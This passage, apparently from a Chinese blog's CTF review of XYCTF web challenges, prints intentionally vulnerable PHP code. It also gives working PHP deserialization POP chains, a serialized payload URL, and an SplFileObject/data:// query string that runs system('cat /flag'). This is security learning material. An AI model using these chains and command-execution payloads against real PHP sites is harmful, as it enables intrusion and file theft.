class="hljs-variable">$lao</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$chen</span>; <br>        &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span> </span>&#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;xxxxx&quot;</span>;<br>            <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>; <br>            &#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> E;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> D;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> B;<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> A;<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> C;<br><span class="hljs-variable">$a</span>-&gt;name=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;lao=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span>-&gt;luo=<span class="hljs-variable">$d</span>;<br><span class="hljs-variable">$d</span>-&gt;mack=<span class="hljs-variable">$e</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="/../images/xyctf/ser1.png" alt="ser1"></p><p>写完一遍发现也不是很难，看看第三层，先贴代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO1</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Liu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$T1ng</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$upsw1ng</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$Liu</span>, <span class="hljs-variable">$T1ng</span>, <span class="hljs-variable">$upsw1ng</span> = Showmaker</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;Liu = <span class="hljs-variable">$Liu</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;T1ng = <span class="hljs-variable">$T1ng</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;upsw1ng = <span class="hljs-variable">$upsw1ng</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO2</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$crypto0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$adwa</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$crypto0</span>, <span class="hljs-variable">$adwa</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;crypto0 = <span class="hljs-variable">$crypto0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">XYCTF</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="hljs-string">&#x27;dev1l&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="hljs-string">&#x27;yuroandCMD258&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO3</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$KickyMu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fpclose</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$N1ght</span> = <span class="hljs-string">&quot;Crypto0&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$KickyMu</span>, <span class="hljs-variable">$fpclose</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;KickyMu = <span class="hljs-variable">$KickyMu</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;fpclose = <span class="hljs-variable">$fpclose</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">XY</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;N1ght == <span class="hljs-string">&#x27;oSthing&#x27;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;WOW, You web is really good!!!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;X&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Y&#x27;</span>]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;KickyMu-&gt;<span class="hljs-title function_ invoke__">XYCTF</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">XY</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;CTF&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;CTF&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p>好多出题人被扒上面啊，该打呜呜呜。</p><p>看了一遍好难，原生链和利用链，跟着师傅的思路跑一遍。</p><p>？写多了我感觉也不是太难了，上代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO1</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Liu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$T1ng</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$upsw1ng</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO2</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$crypto0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$adwa</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO3</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$KickyMu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fpclose</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$N1ght</span> = <span class="hljs-string">&quot;Crypto0&quot;</span>; <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO3</span>;<br><span class="hljs-variable">$a</span>-&gt;N1ght=<span class="hljs-string">&#x27;oSthing&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;KickyMu=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO2</span>;<br><span class="hljs-variable">$a</span>-&gt;KickyMu-&gt;adwa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO1</span>;<br><span class="hljs-variable">$a</span>-&gt;KickyMu-&gt;adwa-&gt;T1ng=<span class="hljs-string">&#x27;yuroandCMD258&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>这里注意有private，需要%00填上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">$this-&gt;adwa-&gt;crypto0 != &#x27;dev1l&#x27;的原因还需要添s:7:&quot;crypto0&quot;;s:5:&quot;dev1l&quot;;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?CTF=O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO3&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;KickyMu&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO2&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;crypto0&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;adwa&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO1&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Liu&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;T1ng&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;yuroandCMD258&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;%00XYCTFNO1%00upsw1ng&quot;</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;crypto0&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;dev1l&quot;</span>;&#125;&#125;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;fpclose&quot;</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;N1ght&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;oSthing&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>post里面y肯定是构造伪协议这没什么问题，x的话我就不太懂了，<a href="https://blog.csdn.net/weixin_39534780/article/details/115514259?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=SplFileObject&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-115514259.nonecase&amp;spm=1018.2226.3001.4187">文章</a>，简要了解一下，类似file_get_contents，这里前面有new,可以用Splfileobject使用，确实长知识了。</p><p><img src="/../images/xyctf/ser2.png" alt="ser2"></p><p><img src="/../images/xyctf/ser3.png" alt="ser3"></p><h2 id="ezclass"><a class="markdownIt-Anchor" href="#ezclass"></a> ezClass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$aa</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aa&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-variable">$bb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bb&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>((<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$aa</span>))-&gt;<span class="hljs-variable">$c</span>())((<span class="hljs-keyword">new</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$bb</span>))-&gt;<span class="hljs-variable">$c</span>());<br></code></pre></td></tr></table></figure><p>看了一下wp也是考的Spl原生类+伪协议利用，确实之前不知道这些。</p><p>?a=SplFileObject&amp;aa=data://text/plain,system&amp;c=__toString&amp;b=SplFileObject&amp;bb=data://text/plain,cat%20/flag</p><h2 id="login"><a class="markdownIt-Anchor" href="#login"></a> login</h2><p>没遇过的知识点，可以看看，<a href="https://xz.aliyun.com/t/14061?time__1311=mqmx9DBG0Qi%3DoGNDQiiQGkfD8QaR10B4OiD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F">前置知识</a></p><p>之后可以看官p,太难了技术有限。就到这里了。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>复盘</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
